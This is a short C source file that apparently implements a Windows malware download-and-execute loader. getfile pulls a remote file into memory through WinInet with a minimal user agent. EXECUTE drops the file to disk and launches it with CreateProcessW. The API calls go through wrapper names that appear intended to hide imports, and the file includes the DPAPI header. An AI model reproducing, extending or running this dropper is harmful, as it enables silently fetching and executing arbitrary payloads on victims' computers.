#include <Windows.h>
#include <dpapi.h>
#include <WinInet.h>
#include "header.h"
extern PVOID ZeroBuffer(_Out_writes_bytes_all_(Size) PVOID Pointer, _In_ SIZE_T Size);
#define CHUNKSIZE 1024
extern WCHAR HEADERS[];
HANDLE getfile(LPCWSTR url, PBYTE *ppBuf, PDWORD pdwSize)
{
	DWORD dwAllocated = CHUNKSIZE * 5, dwRead = 0, dwTotalRead = 0;
	BOOL bDownloaded = FALSE;
	HANDLE hHeap = _HeapCreate(0, 0, 0);
	if (hHeap == NULL) {
		return NULL;
	}
	*ppBuf = (PBYTE)_HeapAlloc(hHeap, 0, dwAllocated);

	if (ppBuf == NULL) {
		return NULL;
	}
	PBYTE pTmp = NULL;
	
	LPCWSTR szHeaders = HEADERS;
	HINTERNET hInternet = _InternetOpenW(L"A", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet)
	{
		
		HINTERNET hFile = _InternetOpenUrlW(hInternet, url, szHeaders, _wcslen(szHeaders), INTERNET_FLAG_RELOAD, 0);
		if (hFile)
		{
			do {

				bDownloaded = _InternetReadFile(hFile, (LPVOID)(*ppBuf + dwTotalRead), CHUNKSIZE, &dwRead);

				dwTotalRead += dwRead;
				if (dwTotalRead + CHUNKSIZE > dwAllocated)
				{
					dwAllocated += CHUNKSIZE * 10;
					pTmp = _HeapReAlloc(hHeap, 0, *ppBuf, dwAllocated);

					if (pTmp)
					{
						*ppBuf = pTmp;
					}
					else
					{

						_HeapFree(hHeap, 0, *ppBuf);

						_InternetCloseHandle(hFile);

						_InternetCloseHandle(hInternet);
						*pdwSize = 0;
						*ppBuf = NULL;
						return NULL;
					}
				}


			} while (bDownloaded && dwRead);
			_InternetCloseHandle(hFile);
		}
		_InternetCloseHandle(hInternet);
	}


	*ppBuf = _HeapReAlloc(hHeap, 0, *ppBuf, dwTotalRead);
	if (ppBuf == NULL) {
		return 0;
	}
	*pdwSize = dwTotalRead;
	return hHeap;
}


VOID EXECUTE(PWSTR FileName, PVOID Buffer, ULONG uBuflen) {
	DropFile(FileName, Buffer, uBuflen);
	
//	HANDLE hProcess = NULL;
	//rv = NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, &objattr, NtCurrentProcess(), NORMAL_PRIORITY_CLASS, NULL, NULL, NULL, 0);
	STARTUPINFO si;
	ZeroBuffer(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(si);

	PROCESS_INFORMATION pi;
	ZeroBuffer(&pi, sizeof(PROCESS_INFORMATION));
	_CreateProcessW(FileName, NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
}
